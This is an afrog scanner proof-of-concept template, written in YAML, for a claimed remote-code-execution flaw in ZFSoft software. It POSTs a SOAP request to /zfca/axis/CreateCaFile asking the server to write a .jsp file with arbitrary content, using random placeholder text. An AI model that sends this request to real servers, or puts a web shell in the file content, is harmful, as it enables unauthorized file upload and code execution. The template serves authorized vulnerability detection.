v2/pocs/temp/afrog-pocs/vulnerability/zfsoft-createcafile-rce.yaml

id: zfsoft-createcafile-rce

info:
  name: 正方软件RCE
  author: Observer
  severity: critical
  verified: false
  tags: zfsoft,rce
  created: 2023/12/07

set:
  randstr: randomLowercase(8)
  randbody: randomLowercase(32)
rules:
  r0:
    request:
      method: POST
      path: /zfca/axis/CreateCaFile
      headers:
        Content-Type: text/xml;charset=UTF-8
      body: |
        <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:pub="http://pubService.webServices.zfca.zfsoft.com">
          <soapenv:Header/>
          <soapenv:Body>
              <pub:createFile soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
                <filepath xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">{{randstr}}.jsp</filepath>
                <content xsi:type="soapenc:string" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">
        <![CDATA[
        {{randbody}}
        ]]>
        </content>
              </pub:createFile>
          </soapenv:Body>
        </soapenv:Envelope>
    expression: response.body.bcontains(b'<?xml') && response.body.bcontains(b'<soapenv:Envelope') && response.body.bcontains(b'</soapenv:Envelope>')
expression: r0() 